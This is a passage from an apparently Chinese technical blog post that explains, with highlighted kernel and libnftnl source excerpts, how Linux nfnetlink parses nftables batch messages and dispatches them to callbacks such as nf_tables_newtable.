class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> buf;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, len);</span><br><span class="line">nlh-&gt;nlmsg_len = len;</span><br><span class="line"><span class="keyword">return</span> nlh;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> *<span class="title">mnl_nlmsg_put_extra_header</span><span class="params">(struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *ptr = (<span class="keyword">char</span> *)nlh + nlh-&gt;nlmsg_len;</span><br><span class="line"><span class="keyword">size_t</span> len = MNL_ALIGN(size);</span><br><span class="line">nlh-&gt;nlmsg_len += len;</span><br><span class="line"><span class="built_in">memset</span>(ptr, <span class="number">0</span>, len);</span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以根据这里来看，<code>nfgenmsg</code>结构体就是紧邻着<code>nlmsghdr</code>的（其实根据前面的内存表现也可以看出来，因为<code>skb-&gt;data</code>是直接由<code>kmsg-&gt;msg_iter</code>拷贝过去的）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nlmsg_data</span><span class="params">(<span class="keyword">const</span> struct nlmsghdr *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) nlh + NLMSG_HDRLEN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且内核中在获取<code>nfgenmsg</code>结构体也是直接拿到nlh地址加上其大小的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* No enum here, otherwise __stringify() trick of MODULE_ALIAS_NFNL_SUBSYS()</span></span><br><span class="line"><span class="comment"> * won&#x27;t work anymore */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_EXP2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_QUEUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ULOG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_OSF5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_IPSET6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ACCT7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_TIMEOUT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTHELPER9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFTABLES10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFT_COMPAT11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_COUNT12</span></span><br></pre></td></tr></table></figure><p>这里是各类子系统宏定义的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">u16 subsys_id, u32 genid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">oskb</span> =</span> skb;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> *<span class="title">ss</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> *<span class="title">nc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> <span class="title">extack</span>;</span></span><br><span class="line">LIST_HEAD(err_list);</span><br><span class="line">u32 status;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (subsys_id &gt;= NFNL_SUBSYS_COUNT)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(skb, nlh, -EINVAL, <span class="literal">NULL</span>);</span><br><span class="line">replay:</span><br><span class="line">status = <span class="number">0</span>;</span><br><span class="line">replay_abort:</span><br><span class="line">skb = netlink_skb_clone(oskb, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">return</span> netlink_ack(oskb, nlh, -ENOMEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">nfnl_lock(subsys_id);</span><br><span class="line">ss = nfnl_dereference_protected(subsys_id);</span><br><span class="line"><span class="comment">// ...... check subsystem</span></span><br><span class="line"></span><br><span class="line">nfnl_unlock(subsys_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class="number">0</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> msglen, type;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;extack, <span class="number">0</span>, <span class="keyword">sizeof</span>(extack));</span><br><span class="line">nlh = nlmsg_hdr(skb);</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len ||</span><br><span class="line">    nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct nfgenmsg)) &#123;</span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only requests are handled by the kernel */</span></span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type == NFNL_MSG_BATCH_BEGIN) &#123;</span><br><span class="line"><span class="comment">/* Malformed: Batch begin twice */</span></span><br><span class="line">nfnl_err_reset(&amp;err_list);</span><br><span class="line">status |= NFNL_BATCH_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NFNL_MSG_BATCH_END) &#123;</span><br><span class="line">status |= NFNL_BATCH_DONE;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &lt; NLMSG_MIN_TYPE) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only accept a batch with messages for the same</span></span><br><span class="line"><span class="comment"> * subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (NFNL_SUBSYS_ID(type) != subsys_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nc = nfnetlink_find_client(type, ss);</span><br><span class="line"><span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_MAX_ATTR_COUNT</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity-check NFTA_MAX_ATTR */</span></span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nla_parse_deprecated(cda,</span><br><span class="line">   ss-&gt;cb[cb_id].attr_count,</span><br><span class="line">   attr, attrlen,</span><br><span class="line">   ss-&gt;cb[cb_id].policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">     (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">     &amp;extack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lock was released to autoload some module, we</span></span><br><span class="line"><span class="comment"> * have to abort and start from scratch using the</span></span><br><span class="line"><span class="comment"> * original skb.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ack:</span><br><span class="line"><span class="comment">// ...... out</span></span><br><span class="line">&#125;</span><br><span class="line">done:</span><br><span class="line"><span class="comment">// ...... out</span></span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先判断<code>subsys_id</code>的合法性，随后通过<code>nfnl_dereference_protected</code>函数找到对应的子系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> <span class="title">nf_tables_subsys</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;nf_tables&quot;</span>,</span><br><span class="line">.subsys_id= NFNL_SUBSYS_NFTABLES,</span><br><span class="line">.cb_count= NFT_MSG_MAX,</span><br><span class="line">.cb= nf_tables_cb,</span><br><span class="line">.commit= nf_tables_commit,</span><br><span class="line">.<span class="built_in">abort</span>= nf_tables_abort,</span><br><span class="line">.cleanup= nf_tables_cleanup,</span><br><span class="line">.valid_genid= nf_tables_valid_genid,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随后判断skb中的nlmsg的数量，随后对nlh的长度做判断，再然后对nlh的type做判断，因为在前面执行了<code>skb_pull</code>的缘故，所以这里不能再是<code>NFNL_MSG_BATCH_BEGIN</code>了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *__skb_pull(struct sk_buff *skb, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br><span class="line">&#123;</span><br><span class="line">skb-&gt;len -= len;</span><br><span class="line">BUG_ON(skb-&gt;len &lt; skb-&gt;data_len);</span><br><span class="line"><span class="keyword">return</span> skb-&gt;data += len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">skb_pull_inline</span><span class="params">(struct sk_buff *skb, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> unlikely(len &gt; skb-&gt;len) ? <span class="literal">NULL</span> : __skb_pull(skb, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">skb_pull</span><span class="params">(struct sk_buff *skb, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> skb_pull_inline(skb, len);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(skb_pull);</span><br></pre></td></tr></table></figure><p>这里会让data往后面的数据移动，所以才会有这样一个判断。随后调用<code>nfnetlink_find_client</code>函数到消息的目标对象。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct nfnl_callback *</span></span><br><span class="line"><span class="function"><span class="title">nfnetlink_find_client</span><span class="params">(u16 type, <span class="keyword">const</span> struct nfnetlink_subsystem *ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ss-&gt;cb[cb_id];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是根据type和子系统查找的，子系统已经找到，所以这里主要关注type怎么来的。接下来回到用户态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line"><span class="keyword">int</span> table_seq = seq;</span><br><span class="line">nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure><p>这里看其中一个nlh的生成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">bool</span> <span class="title">mnl_nlmsg_batch_next</span><span class="params">(struct mnl_nlmsg_batch *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> b-&gt;cur;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (b-&gt;buflen + nlh-&gt;nlmsg_len &gt; b-&gt;limit) &#123;</span><br><span class="line">b-&gt;overflow = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">b-&gt;cur = b-&gt;buf + b-&gt;buflen + nlh-&gt;nlmsg_len;</span><br><span class="line">b-&gt;buflen += nlh-&gt;nlmsg_len;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思就会把cur指针下移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct nlmsghdr *<span class="title">nftnl_nlmsg_build_hdr</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">uint16_t</span> cmd, <span class="keyword">uint16_t</span> family,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">uint16_t</span> type, <span class="keyword">uint32_t</span> seq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfh</span>;</span></span><br><span class="line"></span><br><span class="line">nlh = mnl_nlmsg_put_header(buf);</span><br><span class="line">nlh-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; <span class="number">8</span>) | cmd;</span><br><span class="line">nlh-&gt;nlmsg_flags = NLM_F_REQUEST | type;</span><br><span class="line">nlh-&gt;nlmsg_seq = seq;</span><br><span class="line"></span><br><span class="line">nfh = mnl_nlmsg_put_extra_header(nlh, <span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line">nfh-&gt;nfgen_family = family;</span><br><span class="line">nfh-&gt;version = NFNETLINK_V0;</span><br><span class="line">nfh-&gt;res_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nlh;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_nlmsg_build_hdr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nftnl_table_nlmsg_build_hdrnftnl_nlmsg_build_hdr</span></span><br></pre></td></tr></table></figure><p>这里也就会生成一个nlh和一个<code>nfgenmsg</code>。所以也可以清楚的看到其type是有这里cmd指定的，对于这里来说也就是<code>NFT_MSG_NEWTABLE</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> <span class="title">nf_tables_cb</span>[<span class="title">NFT_MSG_MAX</span>] =</span> &#123;</span><br><span class="line">[NFT_MSG_NEWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newtable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_gettable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_deltable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的目标客户端就如上述形式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nf_tables_msg_types</span> &#123;</span></span><br><span class="line">NFT_MSG_NEWTABLE,</span><br><span class="line">NFT_MSG_GETTABLE,</span><br><span class="line">NFT_MSG_DELTABLE,</span><br><span class="line">NFT_MSG_NEWCHAIN,</span><br><span class="line">NFT_MSG_GETCHAIN,</span><br><span class="line">NFT_MSG_DELCHAIN,</span><br><span class="line">NFT_MSG_NEWRULE,</span><br><span class="line">NFT_MSG_GETRULE,</span><br><span class="line">NFT_MSG_DELRULE,</span><br><span class="line">NFT_MSG_NEWSET,</span><br><span class="line">NFT_MSG_GETSET,</span><br><span class="line">NFT_MSG_DELSET,</span><br><span class="line">NFT_MSG_NEWSETELEM,</span><br><span class="line">NFT_MSG_GETSETELEM,</span><br><span class="line">NFT_MSG_DELSETELEM,</span><br><span class="line">NFT_MSG_NEWGEN,</span><br><span class="line">NFT_MSG_GETGEN,</span><br><span class="line">NFT_MSG_TRACE,</span><br><span class="line">NFT_MSG_NEWOBJ,</span><br><span class="line">NFT_MSG_GETOBJ,</span><br><span class="line">NFT_MSG_DELOBJ,</span><br><span class="line">NFT_MSG_GETOBJ_RESET,</span><br><span class="line">NFT_MSG_NEWFLOWTABLE,</span><br><span class="line">NFT_MSG_GETFLOWTABLE,</span><br><span class="line">NFT_MSG_DELFLOWTABLE,</span><br><span class="line">NFT_MSG_MAX,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是其枚举类型。回到内核。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">               (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">               &amp;extack);</span><br></pre></td></tr></table></figure><p>最终会在这里调用其回调函数。</p><h2 id="nftables相关操作及内核实现"><a href="#nftables相关操作及内核实现" class="headerlink" title="nftables相关操作及内核实现"></a>nftables相关操作及内核实现</h2><h3 id="配置表"><a href="#配置表" class="headerlink" title="配置表"></a>配置表</h3><p>在nftables中想要配置表的操作很简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nft add table ip filter</span><br></pre></td></tr></table></figure><p>以上命令即可添加一个表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 